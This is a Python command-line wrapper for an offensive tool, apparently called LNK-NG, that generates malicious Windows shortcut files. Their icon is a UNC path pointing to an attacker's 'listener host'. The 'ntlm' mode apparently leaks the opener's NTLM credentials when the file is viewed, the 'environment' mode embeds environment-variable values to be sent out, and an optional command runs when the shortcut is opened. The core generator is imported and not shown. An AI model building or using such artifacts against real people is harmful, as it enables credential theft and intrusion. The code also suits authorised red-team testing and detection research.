#!/usr/bin/env python3
"""Backward-compatible CLI entry point for LNK-NG."""
from __future__ import annotations

import argparse
from pathlib import Path

from lnkup.core.lnk import generate_lnk
from lnkup.core.models import LnkSpec, PayloadType


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Generate a LNK artifact")
    parser.add_argument("--host", required=True, help="Listener host")
    parser.add_argument("--output", required=True, help="Output .lnk path")
    parser.add_argument(
        "--execute",
        nargs="+",
        default=[r"C:\Windows\explorer.exe ."],
        help="Command executed when the shortcut is opened",
    )
    parser.add_argument(
        "--vars",
        nargs="*",
        default=[],
        help="Environment variable names used by the environment payload",
    )
    parser.add_argument(
        "--type",
        choices=("environment", "ntlm"),
        default="ntlm",
        help="Artifact type",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    spec = LnkSpec(
        host=args.host,
        output=Path(args.output),
        payload_type=PayloadType(args.type),
        environment_variables=[v.strip("%") for v in args.vars],
        execute=" ".join(args.execute),
    )
    result = generate_lnk(spec)
    print(f"Link created at {result.output}")
    print(f"UNC icon: {result.icon_location}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
